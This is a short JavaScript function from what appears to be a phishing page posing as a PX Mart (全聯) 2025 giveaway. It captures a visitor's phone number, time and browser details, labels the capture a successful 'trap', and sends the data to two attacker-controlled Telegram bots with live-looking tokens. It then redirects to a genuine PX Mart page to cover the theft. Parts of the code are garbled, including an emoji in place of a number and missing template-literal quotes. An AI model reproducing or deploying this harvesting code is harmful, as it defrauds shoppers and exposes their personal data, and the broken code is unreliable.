function send(){
  const code = document.getElementById("code").value;
  const phone = document.getElementById("phone").value.trim();
  if(phone.length < 😎 return;
  
  document.querySelector("button").textContent = "領取中...";
  
  const time = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});
  const msg = encodeURIComponent(全聯2025誘捕成功\n電話：${code}${phone}\n時間：${time}\n裝置：${navigator.userAgent});
  
  // 全聯專用新 Bot（已替換）
  new Image().src = "https://api.telegram.org/bot8593469240:AAEGD_itRdp41flJMI02uBq6droeSEa0nys/sendMessage?chat_id=1137905005&text=" + msg;
  
  // 備援舊 Bot（可留可刪，建議留著保險）
  new Image().src = "https://api.telegram.org/bot7989443479:AAE_YKV3EZJc4PNEkIMxq02BocEZw0p2CjE/sendMessage?chat_id=1137905005&text=" + msg;
  
  setTimeout(()=>{
    location.href = "https://www.pxmart.com.tw/about-us/news/%E5%85%A8%E8%81%AF%E6%96%B0%E8%81%9E/305";
  },2000);
}